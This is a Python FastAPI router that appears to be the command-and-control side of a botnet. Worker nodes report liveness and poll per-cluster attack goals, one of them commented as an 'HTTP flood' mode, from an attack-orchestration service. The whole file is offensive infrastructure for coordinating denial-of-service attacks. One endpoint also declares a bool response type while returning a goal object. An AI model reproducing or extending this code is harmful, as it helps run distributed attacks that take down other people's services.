from fastapi import APIRouter
from rvkinh_message_protocol import Worker, GoalHaru, GoalAkio, WorkerHaruSettings
from services.service_liveness import ServiceLiveness
from services.service_attack_orchestration import ServiceAttackOrchestration


router_worker = APIRouter()
service_liveness = ServiceLiveness()
service_attack_orchestration = ServiceAttackOrchestration()


GOAL_HARU_STOPPED = GoalHaru([], WorkerHaruSettings(-1, -1, '', -1))
GOAL_AKIO_STOPPED = GoalAkio([], "", "", -1)


@router_worker.post("/worker/alive", response_model=bool)
def worker_alive(worker: Worker) -> bool:
    return service_liveness.mark_alive(worker)


# THIS IS FOR HTTP FLOOD SPECIALITY
@router_worker.post("/worker/goal/haru", response_model=GoalHaru)
def worker_goal_haru(worker: Worker) -> GoalHaru:
    attack_orchestration = service_attack_orchestration.get()
    if worker.cluster_id not in attack_orchestration.goal_haru_by_cluster_id:
        return GOAL_HARU_STOPPED
    else:
        return attack_orchestration.goal_haru_by_cluster_id[worker.cluster_id]


# THIS IS FOR GENERIC SPECIALITY
@router_worker.post("/worker/goal/akio", response_model=bool)
def worker_goal_akio(worker: Worker) -> GoalAkio:
    attack_orchestration = service_attack_orchestration.get()
    if worker.cluster_id not in attack_orchestration.goal_akio_by_cluster_id:
        return GOAL_AKIO_STOPPED
    else:
        return attack_orchestration.goal_akio_by_cluster_id[worker.cluster_id]
